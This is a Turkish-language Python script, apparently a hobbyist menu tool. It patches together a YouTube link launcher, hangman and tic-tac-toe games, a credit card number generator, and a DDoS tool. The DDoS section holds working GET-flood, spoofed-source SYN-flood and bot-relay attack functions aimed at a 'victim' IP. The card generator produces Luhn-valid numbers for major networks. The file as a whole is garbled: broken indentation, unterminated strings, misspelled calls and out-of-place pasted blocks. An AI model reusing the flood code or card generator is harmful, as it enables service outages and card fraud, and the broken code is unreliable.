import os
from random import Random
import copy
from typing import NewType 
import webbrowser 
import socket 
import threading
import sys
import urllib.request
from scapy.all import *
import platform
import turtle 

print("<------------DEUS LORENZO MTV V2---------------->")
print("! 1 - TERMİNAL DİLİNİ TÜRKÇE YAP !")                
print("!-------------------------------!")
print("! 2 - MÜZİK DİNLEME ARACI !")
print("!-------------------------------!")
print("! 3 - CC GENERATOR !")
print("! ------------------------------!")
print("! 4 - HUMOR !")
print("! ------------------------------!")
print("! 5 - HIZLI LİNKLER !")
print("!-------------------------------!")
print("! 6 - DDOS ARACI  !")
print("! ------------------------------!")
print("! 7 - OYUNLAR !")
print("! ------------------------------!")
print("! 8 - ANONİMLİK REHBERİ !")
print("--------------------------------!") 
print("  9 - ÇIKIŞ ")
print("<--------------------ONLİNE ASİSTAN--------------->!")
###Coded By Deus Lorenzo
vur = input("Merhaba, Seçim Yapınız "("çıkmak için 9'a Tıklayın")
if vur == "1" :
    vur1 = input("Terminal dilini türkçe yapmak için enterlayın..:")
       os.system("
    setxkbmap tr")
if vur == "2" :
    vur2 = input(" Ne dinlemek istersin kanka..:")
    #
    #
    print("1 Satori Zoom Buster")
    print("2 Massaka cehennemin dibi")
    print("3 Decayed ")
    print("4 Senpai shido Supraaaaaaa")    
    print("5 katliam 1")
    print("6 Dr Fuchs Soğuk Mevsim")    
    print("7 Ceza hepsi birbirinden güzel seçim yok random xd ")
    print("8 Müslüm Gürses Gel Bahtımın Kar Beyazı")
    print("9 Azer bülbül zordayım")
    print("10 Defkan Mat")
    print("11 Russ Big Shark")
    print("12 Lagrange Style")
    print("13 Cocaina Remix")
    print("14 batuflex Ralli")
    print("15 Body Remix")
    print("16 GoodBYe Remix")
    print("17 Letoa Guap")
    print("18 Xanakın Macho!")
    if vur2 == "1" : 
     webbrowser.open_new("https://www.youtube.com/watch?v=RE68X9u_OVs")
if vur2 == "2" :  
    webbrowser.open_new("https://www.youtube.com/watch?v=oyXYIUioJ2g")
if vur2 == "3" :
    webbrowser.open_new("https://www.youtube.com/watch?v=vBj6Cfp3rIE")
if vur2 == "4" : 
    webbrowser.open_new("https://www.youtube.com/watch?v=ZHA5S0pD5mM")
if vur2 == "5" :
    webbrowser.open_new("https://www.youtube.com/watch?v=GPM0NHVyH9U")
if vur == "6"
    webbrowser.open_new("https://www.youtube.com/watch?v=qkqdlatMoXg")
if vur2 == "7" : 
    webbrowser.open_new("https://www.youtube.com/watch?v=mY--4-vzY6E") 
if vur2 == "8":
    webbrowser.open_new("https://www.youtube.com/watch?v=CZjdL6bC3wg")
if vur2 == "9":
    webbrowser.open_new("https://www.youtube.com/watch?v=aiCQhTCCod4")
if vur2 == "10" : 
    webbrowser.open_new("https://www.youtube.com/watch?v=M")
if vur2 == "11" :
    webberowser.open_new("https://www.youtube.com/watch?v=36YrBdP0KVg")
if vur2 == "12" :
    webbrowser.open_new("https://www.youtube.com/watch?v=PjR1Ra3y-9U")
if vur2 == "13" : 
     webbeowser.open_new("https://www.youtube.com/watch?v=JJgGg1OXj90")
if vur2 == "14" :
    webbrowser.open_new("https://www.youtube.com/watch?v=BgIdPnM0CH4")
if vur2 == "15" : 
     webbrowser.open_new("https://www.youtube.com/watch?v=BS3HgiHPYcs")
if vur2 == "16" : 
    webbrowser.open.new("https://www.youtube.com/watch?v=owfx8Hx--Us")
if vur2 == "17" : 
    webbrowser.open.new("https://www.youtube.com/watch?v=JpKnf20Lkto")
if vur2 == "18" : 
    webbrowser.open.new("https://www.youtube.com/watch?v=3_umUPVwrq8")
    if vur == "3" : 
    from random import Random
import copy

visaPrefixList = [
        ['4', '5', '3', '9'],
        ['4', '5', '5', '6'],
        ['4', '9', '1', '6'],
        ['4', '5', '3', '2'],
        ['4', '9', '2', '9'],
        ['4', '0', '2', '4', '0', '0', '7', '1'],
        ['4', '4', '8', '6'],
        ['4', '7', '1', '6'],
        ['4']]

mastercardPrefixList = [
        ['5', '1'], ['5', '2'], ['5', '3'], ['5', '4'], ['5', '5']]

amexPrefixList = [['3', '4'], ['3', '7']]

discoverPrefixList = [['6', '0', '1', '1']]

dinersPrefixList = [
        ['3', '0', '0'],
        ['3', '0', '1'],
        ['3', '0', '2'],
        ['3', '0', '3'],
        ['3', '6'],
        ['3', '8']]

enRoutePrefixList = [['2', '0', '1', '4'], ['2', '1', '4', '9']]

jcbPrefixList = [['3', '5']]

voyagerPrefixList = [['8', '6', '9', '9']]


def completed_number(prefix, length):
    """
    'prefix' is the start of the CC number as a string, any number of digits.
    'length' is the length of the CC number to generate. Typically 13 or 16
    """

    ccnumber = prefix

    # generate digits

    while len(ccnumber) < (length - 1):
        digit = str(generator.choice(range(0, 10)))
        ccnumber.append(digit)

    # Calculate sum

    sum = 0
    pos = 0

    reversedCCnumber = []
    reversedCCnumber.extend(ccnumber)
    reversedCCnumber.reverse()

    while pos < length - 1:

        odd = int(reversedCCnumber[pos]) * 2
        if odd > 9:
            odd -= 9

        sum += odd

        if pos != (length - 2):

            sum += int(reversedCCnumber[pos + 1])

        pos += 2

    # Calculate check digit

    checkdigit = ((sum / 10 + 1) * 10 - sum) % 10

    ccnumber.append(str(checkdigit))

    return ''.join(ccnumber)


def credit_card_number(rnd, prefixList, length, howMany):

    result = []

    while len(result) < howMany:

        ccnumber = copy.copy(rnd.choice(prefixList))
        result.append(completed_number(ccnumber, length))

    return result


def output(title, numbers):

    result = []
    result.append(title)
    result.append('-' * len(title))
    result.append('\n'.join(numbers))
    result.append('')

    return '\n'.join(result)

#
# Main
#

generator = Random()
generator.seed()        # Seed from current time

print("credit card generator by ..:: Deus Lorenzo ::..\n")

mastercard = credit_card_number(generator, mastercardPrefixList, 16, 10)
print(output("Mastercard", mastercard))

visa16 = credit_card_number(generator, visaPrefixList, 16, 10)
print(output("VISA 16 digit", visa16))

visa13 = credit_card_number(generator, visaPrefixList, 13, 5)
print(output("VISA 13 digit", visa13))

amex = credit_card_number(generator, amexPrefixList, 15, 5)
print(output("American Express", amex))

# Minor cards

discover = credit_card_number(generator, discoverPrefixList, 16, 3)
print(output("Discover", discover))

diners = credit_card_number(generator, dinersPrefixList, 14, 3)
print(output("Diners Club / Carte Blanche", diners))

enRoute = credit_card_number(generator, enRoutePrefixList, 15, 3)
print(output("enRoute", enRoute))

jcb = credit_card_number(generator, jcbPrefixList, 16, 3)
print(output("JCB", jcb))

voyager = credit_card_number(generator, voyagerPrefixList, 15, 3)
print(output("Voyager", voyager))

if vur == "4" :
    print("kopyala knk(cokkomşk))
    webbrowser.open.new("https://www.google.com/imgres?imgurl=https%3A%2F%2Fi.milliyet.com.tr%2FGazeteHaberIciResim%2F2020%2F10%2F14%2Ffft16_mf14152781.Jpeg&imgrefurl=https%3A%2F%2Fwww.milliyet.com.tr%2Fbaris-bra-tepkisinde-hakli-mi--molatik-17445%2F&tbnid=FJ8apgKM6mjn3M&vet=12ahUKEwiAlKSN2oryAhXFN-wKHSxmANcQMygKegQIARAp..i&docid=uUGU4PraGCDOWM&w=614&h=345&q=bar%C4%B1s%20bra%20ifsa&ved=2ahUKEwiAlKSN2oryAhXFN-wKHSxmANcQMygKegQIARAp")
    os.system
    print("31 sj haha ewq")
if vur == "5": 
        print("https://www.google.com/")
        [+]
        print("https://www.youtube.com/")
        [+]
        print("https://www.instagram.com/")
        [+]
        print("https://www.facebook.com/")
        [+]
        print("https://www.twitch.tv/")
        [+]
        print("https://discord.com/")
        [+]
        print("https://www.instagram.com/deus.lorenzo")
if vur == "6" : 

def GETAttack(target,port,userAgents):
    while (True):
        try:
            data = b"""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-us,en;q=0.5
    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive"""
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + (target).encode('utf-8') + b"\r\n\r\n User-Agent: "
            + random.choice(userAgents).encode('utf-8') + b"\r\n\r\n" + data)
            if (s.recv(4048)):
                print("[+] GET İsteği Gönderildi!")
            else:
                print("[-] GET İsteği Gönderilemedi!")
            s.close()
            time.sleep(0.009)
        except Exception as e:
            print(e)
            print("[-] GET İsteği Gönderilemedi!")

def SYNAttack(target,port):
    while (True):
        try:
            networkLayer = IP(src=".".join(map(str, (random.randint(0,255)for _ in range(4))))
            , dst=target)
            transportLayer = TCP(sport=random.randint(1000,9000),dport=port,flags="S")
            send(networkLayer/transportLayer, verbose=False)
            print("[+] SYN Paketi Gönderildi!")
            time.sleep(0.009)
        except:
            print("[-] SYN Paketi Gönderilirken Bir Hata Oluştu!")


def BOTAttack(host,userAgents):
    bots = []
    file = open("bots.txt","r")
    for i in file.readlines():
        bots.append(i)
    file.close()
    while True:
        try:
            url = random.choice(bots).replace('\n','') + host
            response = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(userAgents)}))
            if (response.read()):
                print ("[+] BOT Saldırısı Başarılı!")
            else:
                print ("[-] BOT Saldırısı Başararısız!")
            time.sleep(0.09)
        except:
            print ("[-] BOT Saldırısı Başararısız!")



def GenerateThreads(get,syn,bot,threadNumber,host,port):
    if (get == True):
        for k in range(0,threadNumber):
            try:
                t = threading.Thread(target=GETAttack, args=[host,port,userAgents])
                t.start()
                print ("[+] " + str(k+1) + ". GET Çekirdeği Açıldı!")
            except:
                print ("[-] " + str(k+1) + ". GET Çekirdeği Açılırken Bir Hata Oluştu!")

    if (bot == True):
        for k in range(0,threadNumber):
            try:
                a = threading.Thread(target=BOTAttack, args=[host,userAgents])
                a.start()
                print ("[+] " + str(k+1) + ". BOT Çekirdeği Açıldı!")
            except:
                print ("[-] " + str(k+1) + ". BOT Çekirdeği Açılırken Bir Hata Oluştu!")


    if (syn == True):
        for k in range(0,threadNumber):
            try:
                b = threading.Thread(target=SYNAttack, args=[host,port])
                b.start()
                print ("[+] " + str(k+1) + ". SYN Çekirdeği Açıldı!")
            except:
                print ("[-] " + str(k+1) + ". SYN Çekirdeği Açılırken Bir Hata Oluştu!")

def UserAgents():
    userAgents = []
    userAgents.append("""Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14""")
    userAgents.append("""Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0""")
    userAgents.append("""Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3""")
    userAgents.append("""Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)""")
    userAgents.append("""Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7""")
    userAgents.append("""Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)""")
    userAgents.append("""Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1""")
    return userAgents

def ShowHelp():
    print ("Kullanım: lorenzodos.py [--kurban IP] [--port PORT] [--thread ÇEKİRDEK]\n")
    print ("  Parametreler:")
    print ("    --kurban veya -k: Saldırıyı yapacağınız kişinin IP adresi")
    print ("    --port veya -p: Kurbana saldıracağınız PORT numarası")
    print ("    --thread veya -t: Her saldırı başına oluşturulacak çekirdek sayısı")
    print ("    --syn veya -s: SYN Taşma Saldırısını metodunu aktive eder.")
    print ("    --get veya -g: GET Saldırı metodunu aktive eder. Varsayılan saldırı tipidir.")
    print ("    --bot veya -b: GET Saldırıları için BOT'ları aktive eder.")
    print ("    --yardım veya -y: Yardım menüsünü gösterir.\n")
    print ("  Örnekler:")
    print ("    SYN Taşma Saldırısı:")
    print ("       sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --syn")
    print ("    GET Taşma Saldırısı:")
    print ("       sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --get")
    print ("    BOT Saldırısı:")
    print ("       sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --bot")
    print ("    Karışık:")
    print ("       sudo python3 d.py --kurban [IP ADRESI] --port [PORT NUMARASI] --thread [ÇEKİRDEK SAYISI] --bot --syn --get")

def ParseArg():
    threadNumber = 0
    syn = False
    get = False
    bot = False
    port = 0
    host = "NONE"

    if (len(sys.argv) < 2 or "-y" in sys.argv or "--yardım" in sys.argv):
        ShowHelp()
        exit()
    for i in range(1,len(sys.argv)):
        if (sys.argv[i] == '--kurban' or sys.argv[i] == '-k'):
            if (sys.argv[i+1]):
                host = sys.argv[i+1]
            else:
                print("[-] Kurban bulunamadı!")
                exit()

        if (sys.argv[i] == '--port' or sys.argv[i] == '-p'):
            if (sys.argv[i+1] and sys.argv[i+1].isdigit()):
                port = int(sys.argv[i+1])
            else:
                print("[-] Port bulunamadı!")
                exit()

        if (sys.argv[i] == '--thread' or sys.argv[i] == '-t'):
            if (sys.argv[i+1] and sys.argv[i+1].isdigit()):
                threadNumber = int(sys.argv[i+1])
            else:
                print("[-] Çekirdek sayısı bulunamadı!")
                exit()

        if (sys.argv[i] == '--syn' or sys.argv[i] == '-s'):
            syn = True
        if (sys.argv[i] == '--get' or sys.argv[i] == '-g'):
            get = True
        if (sys.argv[i] == '--bot' or sys.argv[i] == '-b'):
            bot = True

 print(" _____  ______ _    _  _____   _      ____  _____  ______ _   _ __________  ")
 print("|  __ \|  ____| |  | |/ ____| | |    / __ \|  __ \|  ____| \ | |___  / __ \ ")
 print("| |  | | |__  | |  | | (___   | |   | |  | | |__) | |__  |  \| |  / | |  | |")
 print("| |  | |  __| | |  | |\___ \  | |   | |  | |  _  /|  __| | . ` | / /| |  | |")
 print("| |__| | |____| |__| |____) | | |___| |__| | | \ \| |____| |\  |/ /_| |__| |")
 print("|_____/|______|\____/|_____/  |______\____/|_|  \_|______|_| \_/_____\____/ ")
                                                                             
                                                                             

   

    print (banner)
    print ("Yapımcı: Hichigo | İnternetiniz hızlıysa daha iyi sonuç alabilirsiniz!\n")

    if (host == "NONE"):
        print ("[-] Kurban bulunamadı! Yardım menüsü için --yardım yazınız!")
        exit()

    if (port == 0):
        print ("[-] Port bulunamadı! Yardım menüsü için --yardım yazınız!")
        exit()

    if(bot == False and syn == False and bot == False):
        print ("[?] Saldırı metodu belirlenmemiş. GET Metodu kullanılıyor!")
        get = True

    if (threadNumber == 0):
        print ("[?] Çekirdek sayısı belirlenmemiş. Her methoda 1 çekirdek açılıyor!")
        threadNumber = 1

    return [host,port,threadNumber,get,syn,bot]


if __name__ == '__main__':
    if (os.getuid() != 0):
        print ("[-] Lütfen programı admin veya root olarak açınız!")
        exit()
    userAgents = UserAgents()
    host,port,threadNumber,get,syn,bot = ParseArg()
    #SYNAttack(host,port)
    #GETAttack(host,port,userAgents)
    #BOTAttack(host,userAgents)

    GenerateThreads(get,syn,bot,threadNumber,host,port)
    if vur == "7" : 
        vur7 = input("oyun seçimi yapınız ..:")
        print("[+] 1 Adam Asmaca")
        print("[+] 2 XOX")
        print("[+] 3 Sayı Tahmin Etme")
        print("[+] 4 ekrana yuvarlak çizdirme")
        if vur7 = "1" : 
          ###########ADAM ASMACA OYUNU ##############
            kelimeler = ["yönetim" , "bilişim" , "sistem" , "akustik" , "istasyon" , "köpek" , "kedi" , "yengeç" , "karpuz" , "kiraz"]
kelime = random.choice(kelimeler) #rastgele bir kelime seçtik
tahminSayisi = 5
harfler = [] #kullanicinin girdigi tum harfleri bu listeye ekleyerek tekrar ayni harf girilirse uyari verecegiz
x = len(kelime)
z = list('_' * x)
print(' '.join(z), end='\n') 
while tahminSayisi > 0:
    y = input("Bir harf tahmin edin : ")
    if y in harfler:
        print("Lutfen daha once tahmin ettiginiz harfleri tekrar tahmin etmeyin...")
        continue

    elif len(y) > 1:
        print("Lutfen sadece bir harf girin.")
        continue

    elif y not in kelime:   #girilen harf kelime icinde yoksa eger
        tahminSayisi -= 1
        print("yanlis tahmin!. {} tane tahmin hakkiniz kaldi.".format(tahminSayisi))

    else:
        for i in range(len(kelime)):
            if y == kelime[i]:
                print("Dogru Tahmin")
                z[i] = y
                harfler.append(y)
        print(' '.join(z), end='\n')

    cevap = input("Kelimenin tamamini tahmin etmek istiyor musunuz? ['e' veya 'h'] : ")

    if cevap == "e":
        tahmin = input("Kelimenin tamamini tahmin edebilirsiniz : ")
        if tahmin == kelime:
            print("Tebrikler bildiniz...")
            break
        else:
            tahminSayisi -= 1
            print("Yanlis tahmin ettiniz. {} tane tahmin hakkiniz kaldi.".format(tahminSayisi))


    if tahminSayisi == 0:
        print("Tahmin hakkiniz kalmadi. Kaybettiniz! Adam Asildi.")
        break
    if vur7 == "2" : 
def clear_screan():
    if platform.system() == "Windows":
        os.system('cls')  # on windows
    else:
        os.system('clear') # on linux / os x
#############################XOX OYUNU#####################
def print_board(this_board):
    print("\n  "+ str(this_board[0]), "|", str(this_board[1]), "|", str(this_board[2]))
    print("  - | - | -")
    print("  "+ str(this_board[3]), "|", str(this_board[4]), "|", str(this_board[5]))
    print("  - | - | -")
    print("  "+ str(this_board[6]), "|", str(this_board[7]), "|", str(this_board[8]), "\n")

def is_free(this_board, inpt):
    if this_board[inpt-1] == "X" or this_board[inpt-1] == "O":
        return False
    else:
        return True

def who_win(this_board):
    # Horizontal
    for i in range(0,7,3):
        if (this_board[i] == 'X' and this_board[i+1] == 'X' and this_board[i+2] == 'X') or (this_board[i] == 'O' and this_board[i+1] == 'O' and this_board[i+2] == 'O'):
            return this_board[i+1]

    # Vertical
    for i in range(3):
        if (this_board[i] == 'X' and this_board[i+3] == 'X' and this_board[i+6] == 'X') or (this_board[i] == 'O' and this_board[i+3] == 'O' and this_board[i+6] == 'O'):
            return this_board[i+3]

    # Cross
    if (this_board[0] == 'X' and this_board[4] == 'X' and this_board[8] == 'X') or (this_board[0] == 'O' and this_board[4] == 'O' and this_board[8] == 'O'):
        return this_board[4]

    if (this_board[2] == 'X' and this_board[4] == 'X' and this_board[6] == 'X') or (this_board[2] == 'O' and this_board[4] == 'O' and this_board[6] == 'O'):
        return this_board[4]

    return "Yet_None"

def is_finish(this_board):
    if who_win(this_board) == "Yet_None":
        for i in range(9):
            if this_board[i] != "X" and this_board[i] != "O":
                return False
        return True
    else:
        return True

def create_children(board, turn):
    if is_finish(board):
        return []
    tree = []
    for i in range(0,9):
        board_copy = list(board)
        if board_copy[i] == "X" or board_copy[i] == "O":
            continue
        board_copy[i] = turn
        tree.append(board_copy)
    return list(tree)

def bf_creator(root, turn):
    tree = []
    queue = [(tree, root, turn)]
    tree.append(root)
    while queue != []:
        elem = queue[0]
        queue.remove(elem)
        children = create_children(elem[1], elem[2])
        tmp_turn = "O" if elem[2] == "X" else "X"
        for child in children:
            elem[0].append([child])
            queue.append((elem[0][-1], child, tmp_turn))
    return tree

def leaves(tree):
    last_children = []
    queue = [tree]
    while queue != []:
        elem = queue[0]
        queue.remove(elem)
        if len(elem) == 1:
            last_children.append(elem[0])
        elif len(elem) > 1:
            for child in elem[1:]:
                queue.append(child)
    return last_children

def probability(this_tree):
    probabilities = []
    for i in this_tree[1:]:
        all_leaves = leaves(i)
        count = 0
        for leaf in all_leaves:
            if who_win(leaf) == "X":
                count -= 100
            elif who_win(leaf) == "O":
                count += 1

        not_append = False
        if probabilities != []:
            for a in i[1:]:
                if who_win(a[0]) == "X" and probabilities != []:
                    not_append = True
                    break

        if not_append == False:
            probabilities.append([count/len(all_leaves), i[0]])
    return probabilities

def play_ai(this_tree, board):
    bigger = []
    for i in probability(this_tree):
        if bigger == []:
            bigger = i
        elif i[0] > bigger[0]:
            bigger = i
    return bigger[1]

def play_game(inpt, board, tree):
    board[inpt-1] = "X"
    if is_finish(board) == False:
        play_len = 0
        for i in range(0,9):
            if board[i] == "X" or board[i] == "O":
                play_len += 1
        if play_len <= 1:
            tree = bf_creator(board, "O")
        else:
            for j in tree[1:]:
                for i in j[1:]:
                    if i[0] == board:
                        tree = i
                        break
        board = play_ai(tree, board)
    return board, tree

def print_try_again(board):
    clear_screan()
    print("Try Again !")
    print_board(board)

def main():
    board = [1, 2, 3, 4, 5, 6, 7, 8, 9]
    tree = [board, [], []]
    win = "Yet_None"
    exit_game = False
    order = "O"

    clear_screan()
    print("Artificial Intelligence Tic Tac Toe\nDeus Lorenzo\nExit Game: 0")

    while win == "Yet_None":
        print_board(board)

        while True:
            inpt = input("X's turn: ")
            try:
                inpt = int(inpt)
                if inpt > 0 and inpt <= 9:
                    if inpt == 0:
                        win = "None"
                        break
                    elif is_free(board, int(inpt)):
                        board, tree = play_game(int(inpt), board, tree)
                        if is_finish(board):
                            win = who_win(board)
                        break
                    else:
                        print("this")
                        print_try_again(board)
                else:
                    print_try_again(board)
            except:
                print_try_again(board)
        clear_screan()
        if is_finish(board) == True:
            win = who_win(board)
            if win == "Yet_None":
                win = "None"
            break
    clear_screan()
    print_board(board)
    print("Win: " + win)
    print("Deus lorenzo\nThe End !\n")

main()
#######SAYI TAHMİN ETME OYUNU######################
if vur7 = "3" : 
    while True 
    Tahmin = int(input("Bir Sayı Tahmin Ediniz..:")
    if tahmin >= 290
    print("tebrikler Doğru Bİldin !")
    break
else
    print("Yanlış bildin dostum tekrar dene")
    #########EKRANA YUVARLAK ÇİZDİRME##############
    #pencere
pencere=turtle.Screen()
pencere.bgcolor("black")
 
#cizim
turtle.color("red")
turtle.circle(100)

####### ANONNİMLİK REHBERİ##############
if vur == "8" :
webbrowser.open_new("https://www.webtekno.com/internette-gercek-kimliginizi-gizlemek-icin-uymaniz-gereken-7-kural-h43578.html")
    
    ########TERMNALİ KAPATMA#####
    if vur == "9":
        print("exit")